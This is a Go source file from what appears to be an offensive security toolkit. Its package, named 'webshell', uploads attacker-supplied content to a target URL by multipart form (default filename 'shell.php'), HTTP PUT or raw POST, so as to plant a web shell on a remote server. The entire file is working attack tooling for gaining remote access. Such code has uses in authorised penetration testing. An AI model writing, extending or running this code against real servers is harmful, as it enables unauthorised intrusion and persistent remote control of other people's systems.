package webshell

import (
	"fmt"
	"os"
	"strings"

	"github.com/xiguayiqiu/gyscan_code/httpclient"
)

func Upload(targetURL, content string) error {
	return UploadAs(targetURL, content, "shell.php")
}

func UploadAs(targetURL, content, filename string) error {
	return uploadMultipart(targetURL, content, filename, "")
}

func UploadWithField(targetURL, content, filename, fieldName string) error {
	if fieldName == "" {
		fieldName = "file"
	}
	return uploadMultipart(targetURL, content, filename, fieldName)
}

func UploadViaPUT(targetURL, content string) error {
	targetURL = strings.TrimSpace(targetURL)
	if targetURL == "" {
		return fmt.Errorf("webshell: target URL is empty")
	}
	resp, err := httpclient.R().
		Put(targetURL).
		BodyString(content).
		Do()
	if err != nil {
		return fmt.Errorf("webshell: put upload: %w", err)
	}
	if resp.StatusCode >= 400 {
		return fmt.Errorf("webshell: put upload failed with status %d", resp.StatusCode)
	}
	return nil
}

func UploadViaPOST(targetURL, content string) error {
	targetURL = strings.TrimSpace(targetURL)
	if targetURL == "" {
		return fmt.Errorf("webshell: target URL is empty")
	}
	resp, err := httpclient.R().
		Post(targetURL).
		BodyString(content).
		ContentType("text/plain").
		Do()
	if err != nil {
		return fmt.Errorf("webshell: post upload: %w", err)
	}
	if resp.StatusCode >= 400 {
		return fmt.Errorf("webshell: post upload failed with status %d", resp.StatusCode)
	}
	return nil
}

func UploadWithClient(c *httpclient.Simple, targetURL, content string) error {
	return UploadAs(targetURL, content, "shell.php")
}

func uploadMultipart(targetURL, content, filename, fieldName string) error {
	targetURL = strings.TrimSpace(targetURL)
	if targetURL == "" {
		return fmt.Errorf("webshell: target URL is empty")
	}
	if fieldName == "" {
		fieldName = "file"
	}

	tmpDir, err := os.MkdirTemp("", "webshell_*")
	if err != nil {
		return fmt.Errorf("webshell: create temp dir: %w", err)
	}
	defer os.RemoveAll(tmpDir)

	tmpFile := tmpDir + "/" + filename
	if err := os.WriteFile(tmpFile, []byte(content), 0644); err != nil {
		return fmt.Errorf("webshell: write temp file: %w", err)
	}

	resp, err := httpclient.R().
		Post(targetURL).
		File(fieldName, tmpFile).
		Do()
	if err != nil {
		return fmt.Errorf("webshell: multipart upload: %w", err)
	}
	if resp.StatusCode >= 400 {
		return fmt.Errorf("webshell: multipart upload failed with status %d", resp.StatusCode)
	}
	return nil
}
